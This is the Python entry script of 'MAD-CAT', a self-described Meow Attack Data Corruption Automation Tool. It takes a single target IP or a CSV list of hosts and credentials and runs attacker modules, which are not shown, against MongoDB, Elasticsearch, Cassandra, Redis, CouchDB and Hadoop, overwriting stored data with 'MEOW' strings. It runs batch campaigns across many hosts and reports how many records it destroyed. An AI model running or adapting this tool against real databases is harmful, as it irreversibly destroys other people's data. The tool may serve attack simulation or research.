#!/usr/bin/env python3
import argparse
import sys
import logging
import traceback
import random
import csv
import os
import time
# Explicitly import attackers to ensure registration happens
import attackers
from core.attack_factory import AttackFactory
from utils.logging import setup_logging

# ANSI color codes
GREEN_BOLD = "\033[1;32m"
RESET = "\033[0m"

def parse_arguments():
    """
    Parse command line arguments.
    """
    parser = argparse.ArgumentParser(
        description='MAD-CAT - Meow Attack Data Corruption Automation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  List supported services:
    python mad_cat.py -l

  Attack MongoDB with default settings:
    python mad_cat.py -t 192.168.1.11 -s mongodb

  Attack Elasticsearch with authentication and custom port:
    python mad_cat.py -t 192.168.1.12 -s elasticsearch -p 9201 -u admin -pw secret

  Attack Cassandra with default settings:
    python mad_cat.py -t 192.168.1.13 -s cassandra

  Attack Redis with default settings:
    python mad_cat.py -t 192.168.1.14 -s redis

  Attack CouchDB with credentials:
    python mad_cat.py -t 192.168.1.15 -s couchdb -u admin -pw password

  Attack Hadoop HDFS:
    python mad_cat.py -t 192.168.1.16 -s hadoop
        """
    )
    
    parser.add_argument('-l', '--list', action='store_true',
                        help='List supported database services')
    parser.add_argument('-c', '--csv', type=str,
                        help='CSV file containing target list (format: ip,service,port,username,password)')
    parser.add_argument('-t', '--target', type=str,
                        help='Target host IP address')
    parser.add_argument('-s', '--service', type=str,
                        help='Database service to attack (e.g., mongodb, elasticsearch, cassandra, redis, couchdb, hadoop)')
    parser.add_argument('-p', '--port', type=int,
                        help='Port number (if not default)')
    parser.add_argument('-u', '--username', type=str,
                        help='Username for authentication')
    parser.add_argument('-pw', '--password', type=str,
                        help='Password for authentication')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    
    return parser.parse_args()

def show_cat_art():
    """Display a cute cat ASCII art."""
    cat_arts = [
        r"""
        ╔═════════════════════════════════════════════════════════════╗
        ║                                                             ║
        ║  ███╗   ███╗ █████╗ ██████╗        ██████╗ █████╗ ████████╗ ║
        ║  ████╗ ████║██╔══██╗██╔══██╗      ██╔════╝██╔══██╗╚══██╔══╝ ║
        ║  ██╔████╔██║███████║██║  ██║█████╗██║     ███████║   ██║    ║
        ║  ██║╚██╔╝██║██╔══██║██║  ██║╚════╝██║     ██╔══██║   ██║    ║
        ║  ██║ ╚═╝ ██║██║  ██║██████╔╝      ╚██████╗██║  ██║   ██║    ║
        ║  ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝        ╚═════╝╚═╝  ╚═╝   ╚═╝    ║
        ║        [Meow Attack Data Corruption Automation Tool]        ║
        ║                        By Karl Biron                        ║
        ║           /\_____/\                     /\_____/\           ║
        ║          /  o   o  \                   /  o   o  \          ║
        ║         ( ==  ^  == )                 ( ==  ^  == )         ║ 
        ║          )         (                   )         (          ║
        ║         (           )                 (           )         ║
        ║        ( (  )   (  ) )               ( (  )   (  ) )        ║
        ║       (__(__)___(__)__)             (__(__)___(__)__)       ║
        ║                                                             ║ 
        ╚═════════════════════════════════════════════════════════════╝
        """,
        r"""
         _________ ____ ____ ____ ____ _________ ____ ____ ____ ____ ____ ____ _________ _________ 
        ||       |||M |||E |||O |||W |||       |||A |||T |||T |||A |||C |||K |||       |||  By   ||
        ||_______|||__|||__|||__|||__|||_______|||__|||__|||__|||__|||__|||__|||_______|||__K.B__||
        |/_______\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\|/_______\|
         ____ ____ ____ ____ _________ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
        ||D |||A |||T |||A |||       |||C |||O |||R |||R |||U |||P |||T |||I |||O |||N |||  MAD  ||
        ||__|||__|||__|||__|||_______|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__CAT__||
        |/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\|
         _________ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
        ||       |||A |||U |||T |||O |||M |||A |||T |||I |||O |||N |||       |||T |||O |||O |||L ||
        ||_______|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
        |/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
        """,
        r"""
        =============================================
            >^..^<    [ M A D - C A T ]    >^..^<      
         Meow Attack Data Corruption Automation Tool
        =============================================
               _______ _______  _____  _  _  _
               |  |  | |______ |     | |  |  |       
               |  |  | |______ |_____| |__|__|
                                   
        "Shredding your databases, one paw at a time"
          ~ By Karl Biron ~
        =============================================
        """,
        r"""
        ╔══════════════════════════════════════════╗
        ║                                          ║  
        ║               MEOW ATTACK                ║
        ║    /\_/\    DATA CORRUPTION    /\_/\     ║
        ║   ( o.o )   AUTOMATION TOOL   ( o.o )    ║
        ║    > ^ <   [ M A D - C A T ]   > ^ <     ║
        ║                                          ║  
        ║              By Karl Biron               ║
        ║                                          ║  
        ╠══════════════════════════════════════════╣
        ║         _      ____  ___   _             ║
        ║        | |\/| | |_  / / \ \ \    /       ║
        ║        |_|  | |_|__ \_\_/  \_\/\/        ║
        ║                                          ║
        ╚══════════════════════════════════════════╝
        """
    ]
    return random.choice(cat_arts)

def parse_csv_file(csv_file_path):
    """
    Parse CSV file containing target list.
    Expected format: ip,service,port,username,password

    Args:
        csv_file_path (str): Path to CSV file

    Returns:
        list: List of dictionaries containing target information

    Raises:
        FileNotFoundError: If CSV file doesn't exist
        ValueError: If CSV format is invalid
    """
    if not os.path.exists(csv_file_path):
        raise FileNotFoundError(f"CSV file not found: {csv_file_path}")

    targets = []

    with open(csv_file_path, 'r') as csvfile:
        csv_reader = csv.reader(csvfile)

        for line_num, row in enumerate(csv_reader, start=1):
            if len(row) < 2:
                raise ValueError(f"Line {line_num}: Invalid CSV format. Expected at least 2 columns (ip,service)")

            # Parse the row
            target_ip = row[0].strip()
            service = row[1].strip()
            port = int(row[2].strip()) if len(row) > 2 and row[2].strip() else None
            username = row[3].strip().strip('"') if len(row) > 3 and row[3].strip().strip('"') else None
            password = row[4].strip().strip('"') if len(row) > 4 and row[4].strip().strip('"') else None

            # Validate required fields
            if not target_ip:
                raise ValueError(f"Line {line_num}: Target IP is required")
            if not service:
                raise ValueError(f"Line {line_num}: Service name is required")

            targets.append({
                'target': target_ip,
                'service': service,
                'port': port,
                'username': username,
                'password': password
            })

    return targets

def main():
    """
    Main entry point for MAD-CAT (Meow Attack Data Corruption Automation Tool).
    """
    print(show_cat_art())
    args = parse_arguments()
    
    # Debug print to verify registrations
    if args.verbose:
        print(f"Registered attackers: {AttackFactory._registered_attackers}")
    
    # Set up logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logger = setup_logging(log_level)
    
    try:
        # List supported services
        if args.list:
            supported_services = AttackFactory.list_supported_services()
            print("\nSupported database services:")
            if not supported_services:
                print("  No services registered! Check installation.")
            else:
                for service in supported_services:
                    print(f"  • {service}")
            print()
            return 0

        # CSV mode vs single target mode
        if args.csv:
            # CSV file mode
            logger.info(f"Loading targets from CSV file: {args.csv}")
            targets = parse_csv_file(args.csv)

            if not targets:
                print("Error: CSV file is empty or contains no valid targets")
                return 1

            print(f"\n[+] Loaded {len(targets)} target(s) from CSV file")
            print("[+] This will corrupt data by replacing values with 'MEOW' strings")

            # Confirm before proceeding
            confirm = input(f"\n[?] Are you sure you want to attack {len(targets)} target(s)? This operation cannot be undone [y/N]: ")
            if confirm.lower() not in ('y', 'yes'):
                print("\n[!] Attack aborted by user")
                return 0

            # Process each target in the CSV
            total_stats = {
                "targets_attempted": 0,
                "targets_succeeded": 0,
                "targets_failed": 0,
                "databases_processed": 0,
                "collections_processed": 0,
                "records_affected": 0
            }

            for idx, target_info in enumerate(targets, start=1):
                print(f"\n{'='*60}")
                print(f"[+] Processing target {idx}/{len(targets)}: {target_info['service']} at {target_info['target']}")
                print(f"{'='*60}")

                total_stats["targets_attempted"] += 1

                try:
                    # Create appropriate attacker
                    attacker = AttackFactory.create_attacker(
                        target_info['service'],
                        target_info['target'],
                        target_info['port'],
                        target_info['username'],
                        target_info['password']
                    )

                    # Execute the attack
                    stats = attacker.execute_attack()

                    # Update totals
                    total_stats["targets_succeeded"] += 1
                    total_stats["databases_processed"] += stats['databases_processed']
                    total_stats["collections_processed"] += stats['collections_processed']
                    total_stats["records_affected"] += stats['records_affected']

                    print(f"[+] Target {idx} completed: {stats['databases_processed']} DBs, {stats['collections_processed']} collections, {stats['records_affected']} records")

                except Exception as e:
                    total_stats["targets_failed"] += 1
                    print(f"[!] Target {idx} failed: {str(e)}")
                    if args.verbose:
                        traceback.print_exc()

                # Add 2 second delay before processing next target (except after the last one)
                if idx < len(targets):
                    time.sleep(2)

            # Display final results
            print(f"\n{'='*60}")
            print("[+] CSV Attack Campaign Completed!")
            print(f"{'='*60}")
            print(f"[+] Targets attempted: {total_stats['targets_attempted']}")
            print(f"[+] Targets succeeded: {total_stats['targets_succeeded']}")
            print(f"[+] Targets failed: {total_stats['targets_failed']}")
            print(f"[+] Total databases processed: {total_stats['databases_processed']}")
            print(f"[+] Total collections processed: {total_stats['collections_processed']}")
            print(f"[+] Total records affected: {total_stats['records_affected']}")
            print(f"\n{GREEN_BOLD}[+] All data has been MEOWed!{RESET} ᓚᘏᗢ")

            return 0

        else:
            # Single target mode
            # Validate required arguments
            if not args.target:
                print("Error: Target host (-t) is required (or use -c for CSV file)")
                return 1

            if not args.service:
                print("Error: Database service (-s) is required")
                return 1

            # Create appropriate attacker
            attacker = AttackFactory.create_attacker(
                args.service,
                args.target,
                args.port,
                args.username,
                args.password
            )

            print(f"\n[+] Starting MEOW attack on {args.service} at {args.target}")
            print("[+] This will corrupt data by replacing values with 'MEOW' strings")

            # Confirm before proceeding
            confirm = input("\n[?] Are you sure you want to continue? This operation cannot be undone [y/N]: ")
            if confirm.lower() not in ('y', 'yes'):
                print("\n[!] Attack aborted by user")
                return 0

            # Execute the attack
            print("\n[+] Executing MEOW attack...")
            stats = attacker.execute_attack()

            # Display results
            print(f"\n{GREEN_BOLD}[+] Attack completed successfully!{RESET}")
            print(f"[+] Databases processed: {stats['databases_processed']}")
            print(f"[+] Collections processed: {stats['collections_processed']}")
            print(f"[+] Records affected: {stats['records_affected']}")
            print("\n[+] All data has been MEOWed! ᓚᘏᗢ")

            return 0
        
    except ValueError as e:
        print(f"\nError: {str(e)}")
        return 1
        
    except Exception as e:
        print(f"\nError: An unexpected error occurred: {str(e)}")
        if args.verbose:
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())